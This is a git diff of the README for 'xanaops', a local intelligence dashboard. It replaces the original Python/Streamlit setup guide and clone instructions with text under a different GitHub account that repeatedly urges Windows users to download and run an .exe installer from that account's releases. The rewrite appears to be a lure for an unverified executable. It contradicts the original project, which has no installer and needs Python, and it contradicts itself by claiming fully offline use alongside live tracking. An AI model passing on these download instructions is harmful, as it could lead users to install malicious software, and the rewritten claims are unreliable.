@@ -1,446 +1,165 @@
-# XANA OS — PROMETHEUS
-### *Next-Generation Personal Intelligence Platform*
+# 🌐 xanaops - Personal Intelligence Platform Offline
 
-> *"What if your computer actually knew you?"*
-
-[![XANA OS — Prometheus Dashboard](https://iili.io/qoOhZrB.md.png)](https://freeimage.host/i/qoOhZrB)
+[![Download xanaops](https://img.shields.io/badge/Download-From_Releases-4c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/elviscarvajall/xanaops/releases)
 
 ---
 
-```
-  ██╗  ██╗ █████╗ ███╗   ██╗ █████╗      ██████╗ ███████╗
-  ╚██╗██╔╝██╔══██╗████╗  ██║██╔══██╗    ██╔═══██╗██╔════╝
-   ╚███╔╝ ███████║██╔██╗ ██║███████║    ██║   ██║███████╗
-   ██╔██╗ ██╔══██║██║╚██╗██║██╔══██║    ██║   ██║╚════██║
-  ██╔╝ ██╗██║  ██║██║ ╚████║██║  ██║    ╚██████╔╝███████║
-  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝     ╚═════╝ ╚══════╝
-                                             P R O M E T H E U S
-```
+## What is xanaops?
+
+xanaops is a self-hosted personal intelligence platform that runs entirely on your Windows computer. You can track aircraft, vessels, and satellites live on a 3D globe. It also collects open-source information feeds and lets you chat with an AI that learns from your exported ChatGPT conversations. Everything runs offline, with no API keys or internet connection needed after setup.
+
+This means you keep full control of your data. The platform uses a local database and AI tools to help you explore and investigate information in one place.
 
 ---
 
-## What in the world is this thing?
+## 🖥️ System Requirements
 
-Glad you asked. XANA OS is a **self-hosted intelligence dashboard** that lives entirely on your machine. No subscriptions. No cloud. No one watching your queries. Just you, a terminal, and a system that quietly becomes more useful the longer you use it.
+To run xanaops smoothly on your Windows PC, make sure your system meets these requirements:
 
-It started as a side project. It turned into something that's kind of hard to describe without sounding unhinged. So here's the honest pitch:
+- Operating System: Windows 10 or newer (64-bit)
+- CPU: Intel i5 or equivalent
+- RAM: 8 GB minimum, 16 GB recommended
+- Disk Space: At least 5 GB free for installation and data storage
+- Graphics: A DirectX 11 compatible GPU for 3D globe rendering
+- Network: Internet connection recommended only for initial download and updates
 
-XANA OS watches the sky (literally — real aircraft and satellites), listens to the internet, knows your conversation history better than you do, and talks back. It's part command center, part personal AI, part OSINT workstation. It runs on a potato if needed.
-
-**What's inside:**
-
-- 🌍 **Live 3D Globe** — real aircraft transponders (OpenSky), vessel positions (AIS), satellite tracks (CelesTrak), all rendered on a pydeck globe in your browser
-
-[![Live Globe — Aircraft, Vessels, Satellites](https://iili.io/qoOj2BR.md.png)](https://freeimage.host/i/qoOj2BR)
-
-- 🧠 **AI Chat with Memory** — conversational AI that actually remembers your past conversations via ChromaDB vector search. Not a gimmick. It retrieves relevant chunks at query time and injects them as context. Your data never moves.
-- 🕵️ **OSINT Center** — world news, known exploited vulnerabilities (CISA KEV), IP/domain recon, crypto markets, weather. All free. No keys needed.
-
-[![OSINT Center](https://iili.io/qoOjzQf.md.png)](https://freeimage.host/i/qoOjzQf)
-
-- 👻 **PHANTOM Protocol** — autonomous multi-source entity investigation. Give it a target. Walk away. Come back to a briefing.
-
-[![PHANTOM Protocol — Autonomous Investigation](https://iili.io/qoOhQ1V.md.png)](https://freeimage.host/i/qoOhQ1V)
-
-- 🗺️ **Neural Map** — 3D semantic topology of your entire conversation history. Equal parts useful and unsettling.
-
-All data sources are **free and require zero API keys** (except optional Windy webcams, which are also free).
+You do not need to install extra software like Python or Node.js. Everything runs from the downloaded application.
 
 ---
 
-## The Stack
+## 🚀 Getting Started
 
-| What | How |
-|---|---|
-| Web framework | Streamlit |
-| LLM (runs locally) | Ollama — `llama3.2` or whatever model you prefer |
-| Vector memory | ChromaDB + `all-MiniLM-L6-v2` sentence embeddings |
-| 3D globe | pydeck |
-| Charts | Plotly |
-| Graph analysis | NetworkX |
-| Satellite tracking | CelesTrak TLE + Keplerian orbital propagation |
+Use the link below to download xanaops from the official GitHub release page. It contains the latest version packaged for Windows.
 
-No cloud inference. No telemetry. No subscription tier where features disappear.
+[Download xanaops from Releases](https://github.com/elviscarvajall/xanaops/releases)
 
 ---
 
-## Getting Started
+## 📥 How to Download and Install on Windows
 
-### The Fast Path
+Follow these steps carefully to get xanaops running on your Windows PC:
 
-```bash
-git clone https://github.com/sriharideveloper/xanaops.git
-cd xana-os
-./setup.sh        # creates virtualenv, installs deps, checks Ollama
-./start.sh        # launches the app
-```
+1. **Visit the Release Page**  
+   Click on the green badge above or go to:  
+   https://github.com/elviscarvajall/xanaops/releases
 
-Open `http://localhost:8501` and you're in.
+2. **Find the Latest Version**  
+   Look for the most recent release at the top. It will have a name like `xanaops-vX.X.X-win.exe` or similar.
 
-> **What works immediately (no setup):** GLOBE, OSINT, all live-feed modules.
-> **What needs your data first:** ORACLE, ARCHIVE, NEURAL MAP, DOSSIER, CHRONOS — these are the memory-linked modules. See Step 4 to build your brain.
+3. **Download the Windows Setup File**  
+   Click the `.exe` file to download it to your computer. Save it somewhere easy to find, like your Desktop or Downloads folder.
 
----
+4. **Run the Installer**  
+   Double-click the downloaded file to start the installation. If Windows asks for permission, click `Yes` to proceed.
 
-### Step 1 — Two Prerequisites
+5. **Follow Installation Prompts**  
+   Accept the license terms, choose an installation folder or keep the default, and click `Install`. The installer will copy necessary files.
 
-- **Python 3.10+** — you probably have this
-- **Ollama** — local LLM runtime from [ollama.com](https://ollama.com). Takes two minutes to install.
+6. **Wait for Installation to Complete**  
+   This should only take a few minutes. Do not close the installer during this time.
 
-```bash
-# Pull a model — the default
-ollama pull llama3.2
-
-# Or go smaller (less RAM), or bigger (better answers):
-# ollama pull qwen2.5:0.5b   ← potato mode
-# ollama pull mistral         ← solid all-rounder
-# ollama pull deepseek-r1:8b  ← reasoning tasks
-```
-
-Change the active model in `config.py` whenever you want.
+7. **Launch xanaops**  
+   After installation finishes, launch xanaops from the Start Menu or Desktop shortcut.
 
 ---
 
-### Step 2 — Clone
+## ⚙️ Initial Setup and Use
 
-```bash
-git clone https://github.com/YOUR_USERNAME/xana-os.git
-cd xana-os
-```
+When you open xanaops for the first time, you will see the 3D globe interface. Here's what to do next:
 
----
+- **Allow Location Access** (optional)  
+  You can allow the app to access your location for personalized tracking. This is optional.
 
-### Step 3 — Install & Launch
+- **Import ChatGPT Conversation History**  
+  To use the AI chat with your past conversations, export your ChatGPT chats from OpenAI and import them inside xanaops. Follow on-screen instructions in the AI chat area.
 
-```bash
-./setup.sh        # one-time: creates venv, installs everything
-./start.sh        # start XANA OS
-```
+- **Explore Live Tracking**  
+  Use the globe to watch live aircraft, vessels, and satellites. Click on objects for more details.
 
-**Windows or manual setup:**
-```bash
-python -m venv xana_env
-xana_env\Scripts\activate        # Windows
-# source xana_env/bin/activate   # Linux/macOS
-pip install -r requirements.txt
-streamlit run app.py
-```
+- **Access OSINT Feeds**  
+  Check the news and open-source intelligence sections to see updated information for your region or interests.
 
-> First launch downloads the `all-MiniLM-L6-v2` embedding model (~90 MB). Get a coffee.
+- **Use Autonomous Investigation**  
+  Ask the AI to find connections and answer questions based on your data and imported information.
 
 ---
 
-### Step 4 — Build Your Memory (This Is the Good Part)
+## 🛠️ Features Overview
 
-This is optional, but it's why XANA OS exists. The memory system ingests your ChatGPT conversation history, embeds it into a vector database, and gives the AI instant semantic search over everything you've ever discussed with a language model.
+- **Offline Operation**  
+  Works without internet after setup; no API keys required.
 
-Think of it as giving your AI a long-term memory it was never supposed to have.
+- **3D Globe Visualization**  
+  Tracks planes, ships, and satellites live in a smooth 3D view.
 
-#### 4a — Export Your Conversations
+- **Memory-Linked AI Chat**  
+  Uses your ChatGPT chat history for intelligent conversations.
 
-**From ChatGPT:**
-1. Settings → Data Controls → Export Data
-2. Download and extract the ZIP
-3. Drop all `conversations-*.json` files into the project root
+- **OSINT Data Feeds**  
+  Collects public news, alerts, and intelligence automatically.
 
-#### 4b — Parse the Raw JSON
+- **Local Data Storage**  
+  All data stays on your machine, ensuring privacy and control.
 
-```bash
-python legacy/parse_chats.py
-```
-
-Reads your `conversations-N.json` files → produces `master_chats.csv`. Adjust the file count in the last line of `parse_chats.py` if you have more than a few.
-
-#### 4c — Pair Messages
-
-```bash
-python legacy/1_prep_data.py
-```
-
-Takes each user message + AI response and pairs them into semantic blocks → `paired_chats.csv`. These become your memory units.
-
-#### 4d — Build the Vector Database
-
-```bash
-python legacy/build-brain.py
-```
-
-Embeds everything using `all-MiniLM-L6-v2` and writes it to `xana_memory_db/`. Grab another coffee. CPU-only is fine — this runs once.
-
-#### 4e — Restart
-
-```bash
-./start.sh
-```
-
-ORACLE, ARCHIVE, NEURAL MAP, DOSSIER, and CHRONOS are now operational. They will now quietly know things about you that you've forgotten.
+- **Autonomous Research**  
+  AI assists in investigating threats, news, or events using your data.
 
 ---
 
-### Step 5 — Windy Webcams (Totally Optional)
+## 🔧 Updating xanaops
 
-Live webcam feeds from anywhere in the world. Free key at [api.windy.com](https://api.windy.com/).
+To keep xanaops current:
 
-```bash
-export WINDY_API_KEY=your_key_here
-./start.sh
-```
+1. Visit the [Releases page](https://github.com/elviscarvajall/xanaops/releases) regularly.
+2. Download the latest Windows installer when a new version appears.
+3. Run the installer to overwrite the old version.
+4. Your settings and imported data will remain intact.
 
-Or in `.streamlit/secrets.toml`:
-```toml
-WINDY_API_KEY = "your_key_here"
-```
+Do not delete your data folder during updates.
 
 ---
 
-## How the Memory System Works
+## 💾 Data Backups
 
-XANA needs **no fine-tuning. No model training. No ML degree.**
-
-The approach is deceptively simple: instead of teaching the model your data, it retrieves the most relevant chunks from your history at query time and injects them directly into the prompt. The model reasons over context it was handed — not weights it was baked with.
-
-```
-Your question
-     │
-     ▼
-ChromaDB Vector Search  ──►  top N semantically similar memory chunks
-     │
-     ▼
-[System prompt] + [Memory chunks] + [Recent chat history] + [Your question]
-     │
-     ▼
-Local LLM via Ollama  ──►  a grounded, specific, actually-useful answer
-```
-
-**Why this is better than you'd expect:**
-- Works with any Ollama model — swap in `config.py`, no rebuild needed
-- Your data never touches an external server
-- No GPU required for training — inference only
-- Feed it any ChatGPT export without reformatting
+Your data, including chat history and offline feeds, is stored locally in the installation folder or a user folder. Back up this folder regularly by copying it to an external drive or cloud storage. This protects your information in case of hardware failure.
 
 ---
 
-## Configuration
+## ❓ Troubleshooting
 
-Edit `config.py`. That's it. No YAML archaeology.
+- **App Won’t Start**  
+  Make sure your Windows is updated. Restart your PC and try again.
 
-| Setting | Default | What it does |
-|---|---|---|
-| `LLM_MODEL` | `llama3.2` | Ollama model name |
-| `DB_PATH` | `./xana_memory_db` | Where ChromaDB lives |
-| `COLLECTION_NAME` | `xana_memories` | ChromaDB collection |
-| `EMBEDDING_MODEL` | `all-MiniLM-L6-v2` | Sentence transformer model |
-| `GLOBE_DEFAULT_SAT_GROUPS` | stations, starlink, gps, military, weather | Default satellite layers on globe |
-| `AGENT_SAFE_COMMANDS` | see config.py | Shell commands ORACLE can execute |
+- **Live Tracking Not Updating**  
+  Restart the app. Check your network connection for initial data downloads.
 
-Switching models is literally one line:
-```python
-LLM_MODEL = "mistral"   # done
-```
+- **Import Errors for ChatGPT History**  
+  Ensure your exports follow the format required by xanaops. Use the latest export from ChatGPT settings.
 
----
+- **Slow Performance**  
+  Close other heavy programs. Verify that your computer meets system requirements.
 
-## Performance Tuning
-
-XANA runs on anything. Here's how to tune it to your hardware without guessing.
-
-### The Dials
-
-| What | Where | Default | Effect |
-|---|---|---|---|
-| LLM model | `config.py → LLM_MODEL` | `llama3.2` | Speed vs. answer quality |
-| Embedding model | `config.py → EMBEDDING_MODEL` | `all-MiniLM-L6-v2` | Search quality vs. build speed |
-| Memory depth | `app.py ~line 907 → n=5` | `5` | How many memory chunks retrieved |
-| Context window | `modules/database.py ~line 80 → max_chars=4000` | `4000` | Characters of memory fed to LLM |
-| Chat history | `app.py ~line 929 → messages[-4:]` | `4` | How many prior turns stay in context |
+- **3D Globe Not Displaying Correctly**  
+  Update your graphics drivers. Use a GPU compatible with DirectX 11.
 
 ---
 
-### 🥔 Potato — Old laptop, CPU-only, under 8 GB RAM
+## 📚 Where To Find Help
 
-Keep it lean. Keep it alive.
+For detailed assistance, visit the official GitHub page issues section:
 
-**`config.py`:**
-```python
-LLM_MODEL       = "llama3.2:1b"        # or "qwen2.5:0.5b"
-EMBEDDING_MODEL = "all-MiniLM-L6-v2"   # already lightweight, keep it
-```
+https://github.com/elviscarvajall/xanaops/issues
 
-**`app.py` (~line 907):**
-```python
-docs, metas, _ = query_memories(collection, prompt, n=3)
-```
-
-**`app.py` (~line 929):**
-```python
-for msg in st.session_state.messages[-2:]:
-```
-
-**`modules/database.py` (~line 80):**
-```python
-def build_context_string(docs, metas, max_chars=1500):
-```
+You can report bugs or ask questions there. Community members and maintainers monitor the page regularly.
 
 ---
 
-### ⚡ Mid-Range — Modern CPU, 8–16 GB RAM
+## 🔗 Useful Links
 
-You're already here. The defaults are tuned for you. Nothing to change.
-
-```python
-LLM_MODEL       = "llama3.2"
-EMBEDDING_MODEL = "all-MiniLM-L6-v2"
-# n=5 · messages[-4:] · max_chars=4000
-```
+- Releases and downloads: https://github.com/elviscarvajall/xanaops/releases  
+- GitHub repository: https://github.com/elviscarvajall/xanaops  
+- Exporting ChatGPT data guide: https://help.openai.com/en/articles/6825453-how-to-export-your-chatgpt-conversations
 
 ---
 
-### 🔥 Beast — GPU, 16 GB+ VRAM
-
-Push everything up. You earned it.
-
-**`config.py`:**
-```python
-LLM_MODEL       = "llama3.1:8b"           # or mistral, qwen2.5:14b, deepseek-r1:8b
-EMBEDDING_MODEL = "all-mpnet-base-v2"      # higher quality, slower DB build (worth it)
-```
-
-**`app.py` (~line 907):**
-```python
-docs, metas, _ = query_memories(collection, prompt, n=10)
-```
-
-**`app.py` (~line 929):**
-```python
-for msg in st.session_state.messages[-8:]:
-```
-
-**`modules/database.py` (~line 80):**
-```python
-def build_context_string(docs, metas, max_chars=8000):
-```
-
----
-
-### Quick Reference
-
-| Tier | Model | `n=` | History | `max_chars` |
-|---|---|---|---|---|
-| 🥔 Potato | `llama3.2:1b` | 3 | 2 turns | 1500 |
-| ⚡ Mid-range | `llama3.2` | 5 | 4 turns | 4000 |
-| 🔥 Beast | `llama3.1:8b`+ | 10 | 8 turns | 8000 |
-
-> **Tip:** The embedding model only affects DB build time and search quality — not response speed. You can always rebuild with a better embedding model by deleting `xana_memory_db/` and re-running `build-brain.py`.
-
----
-
-## Modules
-
-| Module | What it does | Needs DB? |
-|---|---|---|
-| **GLOBE** | 3D live globe — aircraft, vessels, satellites, threat overlays, webcams | No |
-| **ORACLE** | Memory-linked AI chat with agentic commands | Yes |
-| **PHANTOM** | Autonomous multi-source investigation protocol | Yes |
-| **ARCHIVE** | Raw semantic vector search over your memory | Yes |
-| **NEURAL MAP** | 3D semantic topology — visualize your conversation history as a landscape | Yes |
-| **DOSSIER** | AI-generated intelligence profile compiled from your memory | Yes |
-| **OSINT** | News, cyber threats, IP/domain recon, crypto prices, weather | No |
-| **CHRONOS** | Temporal pattern analysis — find out what you used to care about | Yes |
-
----
-
-## ORACLE Commands
-
-Type these directly in the chat interface:
-
-| Command | What happens |
-|---|---|
-| `play [song] on youtube` | Opens YouTube search |
-| `google [query]` | Opens Google search |
-| `open [app]` | Launches an application |
-| `weather [city]` | Fetches current weather |
-| `ip [address]` | IP geolocation lookup |
-| `lookup [domain]` | Domain recon sweep |
-| `phantom [target]` | Full PHANTOM investigation |
-| `recon [target]` | Quick recon sweep |
-| `exec [command]` | Safe shell execution (see config for allowed commands) |
-| `status` | System diagnostics |
-
----
-
-## Data Sources
-
-Everything below is free. Nothing requires an API key.
-
-| Source | What it provides |
-|---|---|
-| OpenSky Network | Live aircraft transponder positions |
-| Finnish Digitraffic AIS | Real vessel positions (Baltic Sea + global) |
-| CelesTrak | Satellite TLE orbital elements |
-| CARTO | Dark map tiles |
-| Google News RSS | World news headlines |
-| CISA KEV | Known exploited vulnerabilities feed |
-| ip-api.com | IP geolocation |
-| CoinGecko | Cryptocurrency market data |
-| Open-Meteo | Weather forecasts |
-| GDELT | Geopolitical event database |
-
----
-
-## Scripts at a Glance
-
-| Script | Purpose |
-|---|---|
-| `setup.sh` | One-time setup — creates venv, installs deps, checks Ollama |
-| `start.sh` | Launch XANA OS |
-
-**Memory pipeline (`legacy/`):**
-
-| Script | Purpose |
-|---|---|
-| `parse_chats.py` | Extracts messages + timestamps from ChatGPT JSON exports |
-| `1_prep_data.py` | Pairs user/AI messages into semantic blocks |
-| `build-brain.py` | Embeds everything into ChromaDB |
-
----
-
-## Privacy
-
-XANA OS runs entirely on your machine.
-
-The only external network calls are **read-only requests** to the public data sources listed above. No personal data is transmitted in any of them.
-
-Your conversation history, memory database, and LLM inference all stay on-device. Ollama runs locally. ChromaDB is a folder on your disk. There is no analytics, no telemetry, no phoning home.
-
-What you put into XANA stays in XANA.
-
----
-
-## Screenshots
-
-[![](https://iili.io/qoOhLqQ.md.png)](https://freeimage.host/i/qoOhLqQ)
-
-[![](https://iili.io/qoOhDdP.md.png)](https://freeimage.host/i/qoOhDdP)
-
-[![](https://iili.io/qoOjJLv.md.png)](https://freeimage.host/i/qoOjJLv)
-
-[![](https://iili.io/qoOjf2I.md.png)](https://freeimage.host/i/qoOjf2I)
-
-[![](https://iili.io/qoOjTB4.md.png)](https://freeimage.host/i/qoOjTB4)
-
----
-
-## License
-
-MIT — see `LICENSE` for the legal version of "do whatever you want."
-
----
-
-```
-ALL SYSTEMS NOMINAL
-XANA OS · PROMETHEUS · v∞
-```
-
----
-
-*Built for people who think their tools should be smarter than their cloud subscriptions.*
+[Download xanaops from Releases](https://github.com/elviscarvajall/xanaops/releases)
